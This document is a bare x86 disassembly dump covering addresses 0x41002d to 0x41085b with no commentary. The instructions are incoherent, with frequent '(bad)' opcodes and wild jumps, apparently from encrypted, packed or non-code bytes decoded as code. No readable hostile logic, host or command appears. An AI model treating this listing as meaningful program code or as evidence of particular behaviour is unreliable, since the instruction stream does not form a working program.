  41002d:	cmp    eax,0x9a7ad0d2
  410032:	xchg   ebx,eax
  410033:	ret    
  410034:	sbb    al,0x65
  410036:	mov    al,ds:0x49cb0673
  41003b:	and    eax,0xd073babf
  410040:	cdq    
  410041:	mov    al,0x1e
  410043:	cmp    ch,0x2f
  410046:	adc    bh,BYTE PTR [ebx+0x5e4e69f4]
  41004c:	pop    eax
  41004e:	imul   esi,DWORD PTR [ebx-0x70291c49],0x29
  410055:	mov    bh,0xe4
  410057:	jo     0x410012
  410059:	push   es
  41005a:	packsswb mm2,QWORD PTR [ebx+ecx*2]
  41005e:	mov    ch,0x73
  410060:	fadd   DWORD PTR [edi+eax*2-0x1d]
  410064:	mov    dl,0x62
  410066:	mov    al,ds:0x641da8a9
  41006b:	aaa    
  41006c:	ins    BYTE PTR es:[edi],dx
  41006d:	xor    al,0xdd
  41006f:	dec    ebp
  410070:	test   BYTE PTR [ebx-0x64],dl
  410073:	(bad)  
  410074:	std    
  410075:	add    eax,DWORD PTR [ebx-0x6c35ba31]
  41007b:	sub    al,0xd0
  41007d:	ds inc edi
  41007f:	mov    dh,0xf8
  410081:	sub    BYTE PTR [eax+edi*1+0x45],ch
  410085:	mov    eax,0xdfbc909a
  41008a:	jl     0x4100aa
  41008c:	sub    eax,0x1bcd840d
  410091:	bound  ebp,QWORD PTR [esi+0x11453419]
  410097:	in     eax,dx
  410098:	or     eax,0xe2e9d9c
  41009d:	xchg   DWORD PTR [ecx+0x221350d8],ecx
  4100a3:	loope  0x4100a4
  4100a5:	sub    BYTE PTR [eax+0x31],bh
  4100a8:	dec    ecx
  4100a9:	pop    edx
  4100aa:	mov    eax,0x17f1935b
  4100af:	mov    bl,0x35
  4100b1:	and    ah,BYTE PTR [ebp+0x596aac38]
  4100b7:	popa   
  4100b8:	xlat   BYTE PTR fs:[ebx]
  4100ba:	push   esi
  4100bb:	pop    ds
  4100bc:	push   ss
  4100bd:	cmp    al,0x7b
  4100bf:	push   ebx
  4100c0:	(bad)  
  4100c2:	and    BYTE PTR [edi],ch
  4100c4:	popf   
  4100c5:	xlat   BYTE PTR ds:[ebx]
  4100c6:	lea    esp,ds:0x8a6a1c99
  4100cc:	cmp    eax,ecx
  4100ce:	cli    
  4100cf:	or     bl,BYTE PTR [ebx+0x2a]
  4100d2:	call   0x82b7878f
  4100d7:	jo     0x4100fa
  4100d9:	imul   ebx,DWORD PTR [edx-0x79],0x41
  4100dd:	ret    
  4100de:	ror    ah,1
  4100e0:	mov    al,ds:0xb2e58cb1
  4100e5:	fistp  WORD PTR [ebx]
  4100e7:	(bad)  
  4100e8:	jl     0x410129
  4100ea:	mov    ch,0xce
  4100ec:	jae    0x4100da
  4100ee:	add    al,bh
  4100f0:	hlt    
  4100f1:	in     eax,0xd4
  4100f3:	fist   WORD PTR es:[edx+0x56]
  4100f7:	and    DWORD PTR [edi-0x2687ede2],eax
  4100fd:	cmp    ch,BYTE PTR [edx+0x6861d642]
  410103:	push   eax
  410104:	sub    DWORD PTR [edx-0x73],esp
  410107:	popa   
  410108:	push   eax
  410109:	fadd   DWORD PTR [edx]
  41010b:	outs   dx,BYTE PTR ds:[esi]
  41010c:	cmp    ecx,DWORD PTR [ebx-0x2883254d]
  410112:	stc    
  410113:	pop    esp
  410114:	lahf   
  410115:	dec    esp
  410116:	jae    0x410183
  410118:	mov    al,0x9e
  41011a:	dec    esi
  41011b:	mov    cl,0xd0
  41011d:	rol    DWORD PTR [edi],0x5b
  410120:	gs es pop ds
  410123:	out    0x55,eax
  410125:	aam    0x13
  410127:	int3   
  410128:	sbb    BYTE PTR [edx+0x9],dh
  41012b:	in     eax,0x43
  41012d:	jge    0x4100fc
  41012f:	jno    0xa3b7c557
  410135:	inc    edx
  410136:	or     DWORD PTR [esi-0x998667c],ecx
  41013c:	shl    DWORD PTR [edx],0x22
  41013f:	mov    ax,ds:0x221b301b
  410145:	in     al,dx
  410146:	and    esi,DWORD PTR [ebx]
  410148:	test   DWORD PTR [edi-0x37d685a3],esp
  41014e:	jae    0x41013b
  410150:	test   BYTE PTR [ebx-0x5b8fc578],al
  410156:	mov    edx,0xc3a14b6b
  41015b:	lahf   
  41015c:	jno    0x410100
  41015e:	(bad)  
  41015f:	repnz les ebp,FWORD PTR [ebp+0x16c58711]
  410166:	inc    ebp
  410167:	fnstenv ds:[ebp+0x1414bfd7]
  41016e:	fwait
  41016f:	(bad)  
  410170:	fisttp QWORD PTR [edx+eiz*1]
  410173:	mov    BYTE PTR [ecx-0x76d36a88],cl
  410179:	fwait
  41017a:	loop   0x41016d
  41017c:	(bad)  
  41017e:	into   
  41017f:	xor    eax,0x4b05467a
  410184:	lahf   
  410185:	ins    DWORD PTR es:[edi],dx
  410186:	loopne 0x410204
  410188:	sub    esi,DWORD PTR [ebx-0x67]
  41018b:	fisttp WORD PTR [ebx+edi*8+0x34]
  41018f:	dec    esp
  410190:	imul   edx,edi,0xffffffce
  410193:	push   0x9e491868
  410198:	lods   eax,DWORD PTR ds:[esi]
  410199:	pop    edi
  41019a:	add    BYTE PTR [esi+0x22ad0580],0xf7
  4101a1:	retf   
  4101a2:	xchg   ebx,eax
  4101a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101a4:	fstp   TBYTE PTR [ebx]
  4101a6:	pop    eax
  4101a7:	cmp    dh,BYTE PTR [eax-0x5273dc5]
  4101ad:	(bad)  
  4101ae:	jmp    0x41022a
  4101b0:	ror    al,cl
  4101b2:	jae    0x4101ed
  4101b4:	xor    al,0xd6
  4101b6:	jbe    0x4101ba
  4101b8:	loop   0x410187
  4101ba:	in     eax,dx
  4101bb:	adc    BYTE PTR [esp+esi*1],0xa4
  4101bf:	fnstsw WORD PTR [ebx+0x426bcba7]
  4101c5:	pushf  
  4101c6:	nop
  4101c7:	nop
  4101c8:	imul   edi,edi,0xffffff92
  4101cb:	cmp    esp,edi
  4101cd:	fwait
  4101ce:	adc    eax,0x14d8a31d
  4101d3:	fnstsw WORD PTR [edi]
  4101d5:	out    0x75,al
  4101d7:	into   
  4101d8:	test   eax,0x4da92b1f
  4101dd:	inc    esp
  4101de:	pop    es
  4101df:	cmp    ebp,DWORD PTR [eax-0x6a14b0f0]
  4101e5:	add    dh,bl
  4101e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e8:	shr    BYTE PTR [ebx],cl
  4101ea:	xor    DWORD PTR [esi+0x393f30ec],ebp
  4101f0:	gs mov bh,0x8f
  4101f3:	cmp    BYTE PTR [edi-0x5e97bd9],ch
  4101f9:	xchg   BYTE PTR [eax],al
  4101fb:	xlat   BYTE PTR ds:[ebx]
  4101fc:	mov    ah,0x44
  4101fe:	test   al,0x94
  410200:	jle    0x4101b6
  410202:	(bad)  
  410203:	daa    
  410204:	or     eax,0x619324da
  410209:	push   cs
  41020a:	mov    ds:0xe1a0bb9d,al
  41020f:	sub    al,0x4b
  410211:	sbb    BYTE PTR [eax+0xc],bl
  410214:	push   ds
  410215:	push   0xd35c6e9
  41021a:	push   edx
  41021b:	mov    ds:0xa2475927,al
  410220:	test   BYTE PTR [esi+0x20],dh
  410223:	xchg   edx,eax
  410224:	jg     0x410270
  410226:	aam    0xee
  410228:	leave  
  410229:	enter  0x5017,0x41
  41022d:	add    BYTE PTR [edx+0x79],bh
  410230:	fdivr  DWORD PTR [esi+0x1e]
  410233:	jle    0x4101bb
  410235:	enter  0xd800,0xc8
  410239:	fdivp  st(4),st
  41023b:	sahf   
  41023c:	daa    
  41023d:	hlt    
  41023e:	sub    al,0xc2
  410240:	or     WORD PTR [ebp-0x7e],bx
  410244:	and    DWORD PTR [esi+edx*4],ecx
  410247:	and    esp,edx
  410249:	outs   dx,BYTE PTR ds:[esi]
  41024a:	stc    
  41024b:	inc    edx
  41024c:	imul   ebx,esp,0xf3d3c5b1
  410252:	mov    eax,0xd357731f
  410257:	pop    ecx
  410258:	sahf   
  410259:	cmp    bh,bl
  41025b:	sub    al,0xa4
  41025d:	dec    esp
  41025e:	pop    edi
  41025f:	push   ss
  410260:	xchg   esp,eax
  410261:	lods   al,BYTE PTR ds:[esi]
  410262:	test   bl,ch
  410264:	pop    ecx
  410265:	(bad)  
  410266:	sbb    BYTE PTR [eax],bh
  410268:	push   es
  410269:	xchg   ecx,eax
  41026a:	add    al,0xf6
  41026c:	and    al,0xa3
  41026e:	clc    
  41026f:	cli    
  410270:	test   eax,0x59efd18c
  410275:	aam    0xf
  410277:	push   0x2f
  410279:	jle    0x4102b0
  41027b:	or     eax,0x21f49cdd
  410280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410281:	jae    0x410270
  410283:	mov    dh,0x2f
  410285:	xor    DWORD PTR [ecx],eax
  410287:	mov    ebp,0x56ceaf41
  41028c:	adc    dh,BYTE PTR [ebx]
  41028e:	addr16 cs jno 0x410254
  410292:	sbb    eax,0xe4204312
  410297:	call   0xc111:0x9be0c620
  41029e:	hlt    
  41029f:	shl    BYTE PTR [esi+0x22],cl
  4102a2:	xchg   BYTE PTR [eax+0x3c],bh
  4102a5:	and    eax,0x1d88e308
  4102aa:	mov    edx,DWORD PTR ds:0x37d6f373
  4102b0:	aas    
  4102b1:	aad    0x41
  4102b3:	aad    0x60
  4102b5:	xchg   esi,eax
  4102b6:	stos   BYTE PTR es:[edi],al
  4102b7:	pusha  
  4102b8:	sbb    al,0xd2
  4102ba:	cld    
  4102bb:	jmp    0x1a71:0x51dbc440
  4102c2:	mov    edx,esp
  4102c4:	out    dx,al
  4102c5:	xor    BYTE PTR [ebp-0x3b],bl
  4102c8:	cmp    edx,0x8eba3530
  4102ce:	jae    0x410266
  4102d0:	(bad)
  4102d3:	inc    esi
  4102d4:	scas   eax,DWORD PTR es:[edi]
  4102d5:	ret    0x5439
  4102d8:	adc    DWORD PTR [eax+0x5d],ebx
  4102db:	lods   eax,DWORD PTR ds:[esi]
  4102dc:	retf   
  4102dd:	int    0x9e
  4102df:	adc    DWORD PTR [edx],0x1f8a1db6
  4102e5:	(bad)  
  4102e6:	loope  0x410366
  4102e8:	pop    ecx
  4102e9:	mov    ebp,0xc42d482b
  4102ee:	scas   eax,DWORD PTR es:[edi]
  4102ef:	scas   eax,DWORD PTR es:[edi]
  4102f0:	fsub   DWORD PTR [eax+0x19]
  4102f3:	inc    esp
  4102f4:	fiadd  DWORD PTR [esi+0x2f94f1d0]
  4102fa:	es xchg ebp,eax
  4102fc:	enter  0x3cf0,0xc2
  410300:	sub    DWORD PTR [ebp-0x6ad5c56],ecx
  410306:	lds    esp,FWORD PTR [esi+ebx*8]
  410309:	sub    dl,0xb5
  41030c:	rol    BYTE PTR [edx],cl
  41030e:	xor    cl,BYTE PTR [ebx+0x51]
  410311:	test   DWORD PTR [eax-0x68],esp
  410314:	lods   al,BYTE PTR ds:[esi]
  410315:	xlat   BYTE PTR ds:[ebx]
  410316:	jecxz  0x410304
  410318:	or     al,BYTE PTR [ebp+0x23ca4ee6]
  41031e:	ins    BYTE PTR es:[edi],dx
  41031f:	(bad)  
  410320:	mov    dh,0xc8
  410322:	js     0x41037a
  410324:	inc    esp
  410325:	jmp    0xd21c58af
  41032a:	and    al,0x4e
  41032c:	and    eax,0xf476868
  410331:	leave  
  410332:	adc    al,0x3c
  410334:	out    0x2,al
  410336:	inc    esp
  410337:	mov    ah,0x6a
  410339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41033a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41033b:	imul   eax,DWORD PTR [ebx-0x28],0xffffff8d
  41033f:	sar    BYTE PTR [ecx-0x1a488a4a],cl
  410345:	(bad)  
  410346:	call   0x4af82fbb
  41034b:	bound  edi,QWORD PTR [ebp+esi*2-0x23]
  41034f:	xlat   BYTE PTR ds:[ebx]
  410350:	mov    dl,0xb8
  410352:	xor    BYTE PTR [edx-0x42b663cd],dl
  410358:	or     BYTE PTR [edi+0x68fb0a9b],bl
  41035e:	mov    eax,0xf70eed51
  410363:	fnsave [ebp+0x50]
  410366:	rcr    DWORD PTR [ecx+eax*4],0x21
  41036a:	test   ebx,edx
  41036c:	test   al,0x73
  41036e:	hlt    
  41036f:	and    edi,DWORD PTR [edi-0x36]
  410372:	test   BYTE PTR [esi+0x51],ah
  410375:	test   eax,0x7e6c97ca
  41037a:	jmp    0xa8ad:0x4b9db5db
  410381:	mov    edx,0x6e9da66f
  410386:	mov    ebp,0xdd2ab6da
  41038b:	mov    eax,0x52448605
  410390:	std    
  410391:	and    DWORD PTR [ecx+ebp*4],ecx
  410394:	adc    ecx,DWORD PTR [ecx-0x7dfaf7b3]
  41039a:	and    BYTE PTR [eax],al
  41039c:	add    BYTE PTR [ebx+0xd8bfc45],cl
  4103a2:	test   esp,edi
  4103a4:	inc    edx
  4103a5:	add    BYTE PTR [ebx],al
  4103a7:	or     eax,0x42fc89
  4103ac:	mov    DWORD PTR ds:0x42fc85,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e09c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xdd59:0x1b22bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	sub    edi,ebp
  4103dc:	out    0xfd,eax
  4103de:	mov    esp,0x16564c5f
  4103e3:	pop    ds
  4103e4:	adc    edi,DWORD PTR [esi+0x33978af6]
  4103ea:	or     eax,0x57f61b53
  4103ef:	mov    ds:0xb2e8a0f7,al
  4103f4:	(bad)  
  4103f6:	lods   al,BYTE PTR ds:[esi]
  4103f7:	xor    ebp,DWORD PTR [ebp+eiz*8+0x2a]
  4103fb:	sub    esi,DWORD PTR [edi-0x6b1395cf]
  410401:	sahf   
  410402:	pop    ebp
  410403:	(bad)  
  410405:	sti    
  410406:	aad    0xac
  410408:	aad    0x4c
  41040a:	shl    BYTE PTR [esi+ebx*8],1
  41040d:	push   ebp
  41040e:	mov    es,esi
  410410:	ret    
  410411:	ret    0x50d9
  410414:	rol    BYTE PTR [eax],1
  410416:	xchg   edx,eax
  410417:	std    
  410418:	xchg   DWORD PTR ss:[ebp+0x79f14db2],eax
  41041f:	pop    ebx
  410420:	cmp    ch,ch
  410422:	retf   0x27fe
  410425:	pop    ds
  410426:	push   esi
  410427:	sahf   
  410428:	pop    ecx
  410429:	jne    0x4103ef
  41042b:	jle    0x410417
  41042d:	cmp    BYTE PTR [esp+ebx*1-0x6e],ah
  410431:	mov    ch,BYTE PTR [ebx+0x1b7df388]
  410437:	ror    BYTE PTR [ecx],0xd8
  41043a:	mov    ah,0xe
  41043c:	int    0xec
  41043e:	adc    DWORD PTR [ebx],0xde1971b8
  410444:	dec    esi
  410445:	outs   dx,BYTE PTR ds:[esi]
  410446:	inc    ecx
  410447:	dec    esp
  410448:	(bad)  
  410449:	ins    DWORD PTR es:[edi],dx
  41044a:	sub    al,0x65
  41044c:	(bad)  
  41044d:	sub    al,0x59
  41044f:	pushf  
  410450:	or     al,0xfd
  410452:	xchg   BYTE PTR [edx+0x1df98512],bl
  410458:	inc    esp
  410459:	or     ch,BYTE PTR [edx+esi*2-0x1e0122d2]
  410460:	gs sub ecx,edx
  410463:	pop    es
  410464:	clc    
  410465:	leave  
  410466:	rol    DWORD PTR [edx+ebx*8],cl
  410469:	pop    esi
  41046a:	xor    eax,0xd39a41d5
  41046f:	test   al,0x71
  410472:	xchg   DWORD PTR [ecx],edx
  410474:	mov    edx,0x5f3cb110
  410479:	fdivr  QWORD PTR [esi+0x1e0ba943]
  41047f:	pop    ecx
  410480:	or     BYTE PTR [ecx+esi*4+0x4d],dl
  410484:	jns    0x4104de
  410486:	repnz cs push ecx
  410489:	popf   
  41048a:	pop    edi
  41048b:	out    dx,al
  41048c:	stos   DWORD PTR es:[edi],eax
  41048d:	out    0x63,eax
  41048f:	mov    edi,0x605c6ee7
  410494:	adc    edx,0xffffffa3
  410497:	std    
  410498:	repz jmp 0x4104ce
  41049b:	mov    edi,0x846ed82a
  4104a0:	inc    edx
  4104a1:	data16 lods al,BYTE PTR ds:[esi]
  4104a3:	lods   eax,DWORD PTR ds:[esi]
  4104a4:	aad    0xe4
  4104a6:	(bad)  [ebx]
  4104a8:	jmp    0xeb02f7ac
  4104ad:	mov    ebp,0x337a95f7
  4104b2:	loop   0x410453
  4104b4:	cmp    DWORD PTR [ebx+0x58fb196],ebp
  4104ba:	fsub   QWORD PTR gs:[esi-0x30]
  4104be:	(bad)  
  4104bf:	and    eax,0x2159df0c
  4104c4:	sbb    esi,DWORD PTR [esp+edi*8]
  4104c7:	inc    esi
  4104c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104c9:	loop   0x41050e
  4104cb:	int    0xd7
  4104cd:	aad    0x5e
  4104cf:	xor    BYTE PTR [ecx-0x3b1bd1eb],0xd0
  4104d6:	addr16 call 0x1268e53f
  4104dc:	sub    eax,0x52aa19a8
  4104e1:	cld    
  4104e2:	imul   ecx,DWORD PTR [edi+0x8b4e8b],0xe
  4104e9:	into   
  4104ea:	(bad)  
  4104eb:	mov    ds,ecx
  4104ed:	ror    DWORD PTR [esi+0x53],1
  4104f0:	inc    ebp
  4104f1:	rol    DWORD PTR [ecx-0x162d29a],1
  4104f7:	aam    0x2f
  4104f9:	xchg   esi,eax
  4104fa:	mov    DWORD PTR [ebp-0xe],ecx
  4104fd:	mov    eax,0xb90772d0
  410502:	jb     0x41048f
  410504:	add    DWORD PTR [esi-0x2e8b782a],ecx
  41050a:	xchg   BYTE PTR [edx+0x7d83086d],ch
  410510:	test   DWORD PTR [edi],edi
  410512:	and    esp,DWORD PTR [ebx-0x507c920c]
  410518:	rcl    ebx,cl
  41051a:	mov    ax,0x95fd
  41051e:	jl     0x41051d
  410520:	jbe    0x4104fe
  410522:	sbb    esp,DWORD PTR [ebp-0x19]
  410525:	sbb    DWORD PTR [ecx-0x148c72bb],ebx
  41052b:	pop    ds
  41052c:	mov    ah,0x14
  41052e:	mul    DWORD PTR [edi+0x2a]
  410531:	sub    ch,BYTE PTR [edi-0x10714f70]
  410537:	aam    0x59
  410539:	sub    esp,DWORD PTR [ecx-0x20b37452]
  41053f:	xor    eax,0xb1e7b900
  410544:	repnz and DWORD PTR ss:[ecx+ecx*8+0x3],esp
  41054a:	cmp    dl,bl
  41054c:	fdiv   QWORD PTR [eax+0x1c4f6eb7]
  410552:	mov    bl,0xe0
  410554:	lahf   
  410555:	sbb    al,0xac
  410557:	loopne 0x410545
  410559:	cs sub al,0x1c
  41055c:	dec    edi
  41055d:	ja     0x410580
  41055f:	mov    bl,BYTE PTR [eax-0xc]
  410562:	adc    al,0xd7
  410564:	inc    esi
  410565:	push   ds
  410566:	(bad)  
  410567:	jecxz  0x41051c
  410569:	and    ebx,DWORD PTR [esp+edi*2+0x21]
  41056d:	jne    0x41054b
  41056f:	in     eax,0x22
  410571:	fnstcw WORD PTR [edi+0x73e88696]
  410577:	pop    esi
  410578:	lods   eax,DWORD PTR ds:[esi]
  41057a:	sahf   
  41057b:	lock out dx,eax
  41057d:	lahf   
  41057e:	inc    esp
  41057f:	mov    esi,0x4e6b3f02
  410584:	ror    BYTE PTR [ebx-0x7ed7c53b],1
  41058a:	jbe    0x4105f7
  41058c:	inc    ecx
  41058d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058e:	int3   
  41058f:	(bad)  
  410590:	pop    ebx
  410591:	pop    eax
  410592:	jnp    0x410600
  410594:	inc    ecx
  410595:	ja     0x410532
  410597:	iret   
  410598:	and    BYTE PTR [eax-0x54],bh
  41059b:	lds    edi,FWORD PTR [esi+0x34977fd3]
  4105a1:	bound  eax,QWORD PTR [edx]
  4105a3:	fisubr DWORD PTR [edx]
  4105a5:	aas    
  4105a6:	xor    BYTE PTR [edx],dh
  4105a8:	loope  0x4105ad
  4105aa:	and    DWORD PTR [edx-0x4a],edi
  4105ad:	cdq    
  4105ae:	imul   esp,DWORD PTR [ecx],0x14
  4105b1:	and    bl,al
  4105b3:	and    dh,ah
  4105b5:	(bad)  
  4105b6:	shl    DWORD PTR [ebp+0x44d12994],1
  4105bc:	xchg   esi,eax
  4105bd:	xor    dh,BYTE PTR [ecx-0x4d732ba]
  4105c3:	inc    edi
  4105c4:	fistp  WORD PTR [edx+0x64cf413]
  4105ca:	(bad)  
  4105cb:	push   cs
  4105cc:	pop    edx
  4105cd:	and    al,0x5c
  4105cf:	add    al,0x42
  4105d1:	in     al,0x6d
  4105d3:	rcr    DWORD PTR [ecx+0x43],0x95
  4105d7:	xchg   edi,eax
  4105d8:	xchg   esi,eax
  4105d9:	je     0x410659
  4105db:	ja     0x410586
  4105dd:	neg    BYTE PTR [ebx]
  4105df:	imul   ebx,ecx,0x90954dee
  4105e5:	stc    
  4105e6:	loopne 0x41062e
  4105e8:	lds    edi,FWORD PTR [edx-0x3d]
  4105eb:	rcr    BYTE PTR [ecx-0x210e3891],cl
  4105f1:	(bad)  
  4105f2:	push   0x771ac403
  4105f7:	cmp    al,0xe0
  4105f9:	inc    BYTE PTR [edx]
  4105fb:	jmp    0xa1ea8f70
  410600:	in     eax,dx
  410601:	int    0x47
  410603:	out    0xe1,eax
  410605:	inc    esi
  410606:	sub    DWORD PTR [ecx-0x73e3606d],edi
  41060c:	jmp    0x8ca62ac6
  410611:	std    
  410612:	push   ds
  410613:	stos   DWORD PTR es:[edi],eax
  410614:	sbb    ch,BYTE PTR [esi+0x0]
  410617:	retf   0xc1fa
  41061a:	in     al,0x59
  41061c:	xchg   DWORD PTR [ecx],esp
  41061e:	inc    esi
  41061f:	cwde   
  410620:	dec    esi
  410621:	(bad)  
  410622:	xchg   esi,eax
  410623:	mov    WORD PTR [ecx],?
  410625:	arpl   ax,di
  410627:	push   edi
  410628:	push   es
  410629:	fimul  DWORD PTR [ebp-0x32]
  41062c:	pop    ss
  41062d:	sub    cl,al
  41062f:	hlt    
  410630:	adc    esi,DWORD PTR [edi]
  410632:	mov    ds:0x4d72dc1a,al
  410637:	mov    edx,0x48a3cccc
  41063c:	jmp    0xd84c:0x64d929f1
  410643:	retf   0x5241
  410646:	mov    esi,ss
  410648:	in     eax,0xb0
  41064a:	sbb    eax,0x26a21f66
  41064f:	iret   
  410650:	stos   BYTE PTR es:[edi],al
  410651:	sbb    bl,BYTE PTR ds:0x61dc5216
  410657:	das    
  410658:	mov    bh,dl
  41065a:	leave  
  41065b:	(bad)  
  41065c:	addr16 js 0x4105f5
  41065f:	push   ds
  410660:	adc    BYTE PTR [eax-0x679c1b76],bh
  410666:	jp     0x41069c
  410668:	in     al,dx
  410669:	rcr    BYTE PTR [edi+eax*1+0x1d220f4d],1
  410670:	pop    edi
  410671:	icebp  
  410672:	add    bl,BYTE PTR [eax-0x27067cf6]
  410678:	mov    edx,ecx
  41067a:	pop    es
  41067b:	(bad)  
  41067e:	sub    DWORD PTR [esi],edx
  410680:	dec    eax
  410681:	mov    BYTE PTR [ecx+ecx*4],bh
  410684:	loop   0x410684
  410686:	inc    ecx
  410687:	cmp    esp,edi
  410689:	mov    bl,0xc5
  41068b:	dec    esp
  41068c:	outs   dx,BYTE PTR ds:[esi]
  41068d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41068e:	mov    bl,0xfe
  410690:	xchg   ecx,eax
  410691:	cmp    al,0x6b
  410693:	cmp    BYTE PTR [edi+eiz*2],al
  410696:	hlt    
  410697:	ret    0x2139
  41069a:	(bad)  
  41069b:	fidiv  WORD PTR [ebx-0x7f94a592]
  4106a1:	ror    DWORD PTR [eax+0x4e],0xf8
  4106a5:	jns    0x41069b
  4106a7:	rcr    cl,0x3a
  4106aa:	jmp    DWORD PTR [ebx+0x2a12e1a3]
  4106b0:	rcr    ecx,0xbf
  4106b3:	inc    esp
  4106b4:	rcl    eax,0xce
  4106b7:	mov    edi,0x180a137c
  4106bc:	leave  
  4106bd:	das    
  4106be:	cmp    DWORD PTR [ecx],edi
  4106c0:	fisubr DWORD PTR [ebp-0x75]
  4106c3:	add    BYTE PTR [ecx+edi*1-0x23],bh
  4106c7:	ins    DWORD PTR es:[edi],dx
  4106c8:	mov    ebx,0xb7c99ccc
  4106cd:	adc    eax,0x3035b673
  4106d2:	mov    eax,ds:0x9811167d
  4106d7:	cmp    BYTE PTR [ebx],cl
  4106d9:	imul   edi,DWORD PTR [ebp+0x73fb8877],0x6b39b9e0
  4106e3:	inc    ecx
  4106e4:	mov    esi,0x6650f6f7
  4106e9:	adc    ebp,ebp
  4106eb:	xchg   edx,eax
  4106ec:	and    eax,0xcdce25c2
  4106f1:	sub    BYTE PTR [ebp+0x78],dl
  4106f4:	repnz or eax,DWORD PTR [ebp-0x593dd683]
  4106fb:	fs std 
  4106fd:	bound  edi,QWORD PTR [eax-0x78]
  410700:	push   ecx
  410701:	sbb    esi,eax
  410703:	push   ecx
  410704:	(bad)  
  410706:	jecxz  0x41076a
  410708:	inc    esp
  410709:	rcl    BYTE PTR [esi+0x3f],cl
  41070c:	pop    DWORD PTR [edx+0x386b099e]
  410712:	push   0xe0d12a40
  410717:	pop    edi
  410718:	jecxz  0x41074a
  41071a:	cmc    
  41071b:	mov    ebp,0x1b40ec83
  410720:	jp     0x410735
  410722:	push   ecx
  410723:	pop    ds
  410724:	shr    DWORD PTR [edi-0x9],0xfd
  410728:	inc    ecx
  410729:	(bad)  
  41072a:	ror    edx,1
  41072c:	sub    eax,0x1398d2ab
  410731:	icebp  
  410732:	adc    eax,0xd5b7bd59
  410737:	push   edi
  410738:	add    cl,bl
  41073a:	push   edx
  41073b:	sub    DWORD PTR [edi-0x35526ce],ebx
  410741:	adc    bh,BYTE PTR [esi+eax*1]
  410744:	pop    ebx
  410745:	jmp    0x6a35049c
  41074a:	adc    esi,eax
  41074c:	pop    esp
  41074d:	retf   0x45c2
  410750:	stc    
  410751:	fwait
  410752:	ret    0x2b2d
  410755:	mov    BYTE PTR [edi+0x7acd3e03],dl
  41075b:	dec    ecx
  41075c:	sub    edx,DWORD PTR [ebx-0x72]
  41075f:	push   esi
  410760:	(bad)  
  410761:	fisttp QWORD PTR [ecx]
  410763:	sub    dh,BYTE PTR [ecx+0x3e3ecf08]
  410769:	mov    bh,0xb6
  41076b:	arpl   di,sp
  41076d:	pop    esi
  41076e:	in     eax,0xb9
  410770:	(bad)  
  410771:	jnp    0x410714
  410773:	push   eax
  410774:	push   esi
  410775:	push   eax
  410776:	cs lock (bad) 
  410779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41077a:	cmp    eax,0x646281d3
  41077f:	pushf  
  410780:	mov    DWORD PTR [eax+0xe2673d6],esp
  410786:	mov    esi,DWORD PTR es:[ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	inc    esi
  4107a9:	mov    ch,0x8f
  4107ab:	xor    cl,BYTE PTR [ebx-0x5c8f8fba]
  4107b1:	jge    0x410823
  4107b3:	jo     0x410755
  4107b5:	jge    0x4107d8
  4107b7:	dec    esp
  4107b8:	cmp    bl,dl
  4107ba:	adc    eax,0x235e6d3d
  4107bf:	adc    BYTE PTR [esi],cl
  4107c1:	popf   
  4107c2:	or     al,0x42
  4107c4:	xor    eax,0x41c3d1
  4107c9:	mov    ebx,0x44130bdc
  4107ce:	aad    0x29
  4107d0:	adc    BYTE PTR [esi+0x66],dh
  4107d3:	push   ds
  4107d4:	xor    al,0x10
  4107d6:	mov    ebp,0xd5301176
  4107db:	xor    al,0xb1
  4107dd:	push   0xffffff80
  4107df:	or     eax,0xe1e04e39
  4107e4:	out    0x40,al
  4107e6:	jecxz  0x4107e0
  4107e8:	push   ds
  4107e9:	inc    edx
  4107ea:	fstp   DWORD PTR [ecx+0x21]
  4107ed:	add    DWORD PTR [ebx-0x7caefd70],esp
  4107f3:	faddp  st(2),st
  4107f5:	push   esi
  4107f6:	mov    ecx,0x9afa837c
  4107fb:	cmp    eax,0x612ce18b
  410800:	pop    ecx
  410801:	das    
  410802:	and    eax,0xd2270367
  410807:	adc    BYTE PTR ds:0xb853f238,al
  41080d:	cmp    eax,DWORD PTR [esi-0x6d]
  410810:	inc    esi
  410811:	xor    DWORD PTR [eax+ecx*1+0x31],esp
  410815:	nop
  410816:	jmp    0x4107a0
  410818:	adc    eax,0xbe56f6ec
  41081d:	fadd   st(5),st
  41081f:	or     dh,BYTE PTR [edx+0x73]
  410822:	repnz or BYTE PTR cs:[esi],dl
  410826:	rcl    DWORD PTR [eax],cl
  410828:	scas   eax,DWORD PTR es:[edi]
  410829:	out    0x1c,eax
  41082b:	jb     0x410855
  41082d:	mov    bh,0xa5
  41082f:	shr    DWORD PTR [edi],cl
  410831:	jnp    0x410800
  410833:	test   BYTE PTR [edi+0x1a3ada95],bh
  410839:	add    ebp,DWORD PTR [edi+0x3ee69090]
  41083f:	lock repnz xlat BYTE PTR ds:[ebx]
  410842:	(bad)
  410846:	fld    TBYTE PTR [edx+0x3e]
  410849:	je     0x410891
  41084b:	dec    edi
  41084c:	arpl   WORD PTR [edi-0x11],bx
  41084f:	adc    BYTE PTR [ecx],bh
  410851:	dec    esp
  410852:	les    edx,FWORD PTR [esi-0x634af32a]
  410858:	fild   QWORD PTR [eax+0x13]
  41085b:	and    al,0x32
